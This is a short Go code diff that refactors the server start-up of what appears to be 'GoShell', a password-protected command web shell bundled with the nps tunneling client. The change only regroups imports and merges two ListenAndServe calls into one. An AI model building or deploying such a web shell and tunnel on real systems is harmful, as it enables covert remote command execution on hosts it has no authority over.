@@ -5,11 +5,9 @@ import (
 	"log"
 	"net/http"
 
-	"github.com/Wd0g/GoShell/lib/common"
-
-	"github.com/Wd0g/GoShell/lib/server"
-
 	"ehang.io/nps/client"
+	"github.com/Wd0g/GoShell/lib/common"
+	"github.com/Wd0g/GoShell/lib/server"
 )
 
 var (
@@ -32,23 +30,23 @@ func main() {
 	}
 
 	var err error
+	var handler http.Handler
 	switch *mode {
 	case "cmd":
-		handler := server.Cmd{
+		handler = server.Cmd{
 			Pwd:     *webPwd,
 			Decoder: common.NewDecoder(*webDecoder),
 			Encoder: common.NewEncoder(*webEncoder),
 		}
-		err = http.ListenAndServe(*webAddr, handler)
-
 	case "custom":
-		handler := server.Custom{
+		handler = server.Custom{
 			Pwd:     *webPwd,
 			Decoder: common.NewDecoder(*webDecoder),
 			Encoder: common.NewEncoder(*webEncoder),
 		}
-		err = http.ListenAndServe(*webAddr, handler)
 	}
+
+	err = http.ListenAndServe(*webAddr, handler)
 	if err != nil {
 		log.Fatal(err)
 	}
